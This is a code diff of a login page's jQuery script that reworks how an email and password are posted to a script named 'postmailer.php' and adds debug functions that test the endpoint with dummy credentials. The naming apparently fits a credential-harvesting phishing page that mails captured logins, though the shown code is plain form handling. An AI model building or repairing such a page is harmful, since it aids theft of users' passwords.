@@ -217,7 +217,8 @@
                  
                  // Submit the form via AJAX
                  $.ajax({
-                     url: 'postmailer.php',
+                     url: './postmailer.php',
+                     method: 'POST',
                      type: 'POST',
                      data: {
                          email: email,
@@ -226,6 +227,8 @@
                      dataType: 'json',
                      cache: false,
                      timeout: 30000,
+                     processData: true,
+                     contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
                      beforeSend: function() {
                          $('#login_submit').prop('disabled', true).text('Processing...');
                      },
@@ -334,55 +337,81 @@
                   }
               });
               
-              // Debug function to test PHP connection
-              window.testConnection = function() {
-                  console.log('Testing connection to postmailer.php...');
-                  $.ajax({
-                      url: 'test.php',
-                      type: 'GET',
-                      dataType: 'json',
-                      success: function(response) {
-                          console.log('Test connection successful:', response);
-                          alert('PHP is working! Check console for details.');
-                      },
-                      error: function(xhr, status, error) {
-                          console.log('Test connection failed:', {
-                              status: status,
-                              error: error,
-                              responseText: xhr.responseText,
-                              statusCode: xhr.status
-                          });
-                          alert('Connection test failed. Check console for details.');
-                      }
-                  });
-              };
-              
-              // Test postmailer.php specifically
-              window.testPostmailer = function() {
-                  console.log('Testing postmailer.php with POST...');
-                  $.ajax({
-                      url: 'postmailer.php',
-                      type: 'POST',
-                      data: {
-                          email: 'test@example.com',
-                          password: 'test123'
-                      },
-                      dataType: 'json',
-                      success: function(response) {
-                          console.log('Postmailer test successful:', response);
-                          alert('Postmailer is working! Check console for details.');
-                      },
-                      error: function(xhr, status, error) {
-                          console.log('Postmailer test failed:', {
-                              status: status,
-                              error: error,
-                              responseText: xhr.responseText,
-                              statusCode: xhr.status
-                          });
-                          alert('Postmailer test failed. Check console for details.');
-                      }
-                  });
-              };
+                             // Debug function to test PHP connection
+               window.testConnection = function() {
+                   console.log('Testing connection to test.php...');
+                   $.ajax({
+                       url: './test.php',
+                       type: 'GET',
+                       dataType: 'json',
+                       success: function(response) {
+                           console.log('Test connection successful:', response);
+                           alert('PHP is working! Check console for details.');
+                       },
+                       error: function(xhr, status, error) {
+                           console.log('Test connection failed:', {
+                               status: status,
+                               error: error,
+                               responseText: xhr.responseText,
+                               statusCode: xhr.status
+                           });
+                           alert('Connection test failed. Check console for details.');
+                       }
+                   });
+               };
+               
+               // Test postmailer.php with GET first
+               window.testPostmailerGet = function() {
+                   console.log('Testing postmailer.php with GET...');
+                   $.ajax({
+                       url: './postmailer.php',
+                       type: 'GET',
+                       dataType: 'json',
+                       success: function(response) {
+                           console.log('Postmailer GET test successful:', response);
+                           alert('Postmailer GET is working! Check console for details.');
+                       },
+                       error: function(xhr, status, error) {
+                           console.log('Postmailer GET test failed:', {
+                               status: status,
+                               error: error,
+                               responseText: xhr.responseText,
+                               statusCode: xhr.status
+                           });
+                           alert('Postmailer GET test failed. Check console for details.');
+                       }
+                   });
+               };
+               
+               // Test postmailer.php specifically with POST
+               window.testPostmailer = function() {
+                   console.log('Testing postmailer.php with POST...');
+                   $.ajax({
+                       url: './postmailer.php',
+                       method: 'POST',
+                       type: 'POST',
+                       data: {
+                           email: 'test@example.com',
+                           password: 'test123'
+                       },
+                       dataType: 'json',
+                       processData: true,
+                       contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
+                       success: function(response) {
+                           console.log('Postmailer POST test successful:', response);
+                           alert('Postmailer POST is working! Check console for details.');
+                       },
+                       error: function(xhr, status, error) {
+                           console.log('Postmailer POST test failed:', {
+                               status: status,
+                               error: error,
+                               responseText: xhr.responseText,
+                               statusCode: xhr.status
+                           });
+                           alert('Postmailer POST test failed. Check console for details.');
+                       }
+                   });
+               };
           });
        </script>
    </body>
